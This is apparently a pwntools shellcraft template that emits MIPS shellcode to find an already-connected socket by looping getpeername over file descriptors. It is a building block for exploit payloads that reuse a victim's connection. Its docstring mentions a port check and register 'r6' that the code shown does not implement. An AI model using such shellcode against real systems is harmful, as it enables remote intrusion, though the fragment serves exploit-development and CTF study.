<% from pwnlib.shellcraft.mips import mov %>
<% from socket import htons %>
<%page args="port = None"/>
<%docstring>
    findpeer(port)

    Finds a connected socket. If port is specified it is checked
    against the peer port. Resulting socket is left in r6.
</%docstring>
findpeer:
    /* File descriptor in s0 */
    /* Inside the loop we begin by incrementing it */
    /* so initially we want it to be -1 */
    ${mov('$s0', -1)}
    /* Let us restore stack easily */
    ${mov('$s1', '$sp')}

next_socket:
    /* Next file descriptor */
    ${mov('$at', 1)}
    add $s0, $s0, $at

    /* Restore stack */
    ${mov('$sp', '$s1')}

    /* First argument is file descriptor */
    ${mov('$a0', '$s0')}

    /* Second argument is pointer to where to store inet addr */
    add $a1, $sp, -16

    /* Third argument is pointer to size */
    add $a2, $sp, -20

    /* Make room on stack - inet addr structure is 16 bytes and size of addr is four bytes */
    /* First four bytes will be the size of the address, the remaining 16 bytes will be */
    /* the address structure */
    add $sp, $sp, -20
    
    ${mov('$v0', 'SYS_getpeername')}
    syscall 0x42424

    bne $v0, $zero, next_socket
    /* Have a nop */
    ori $zero, $a1, 0xffff
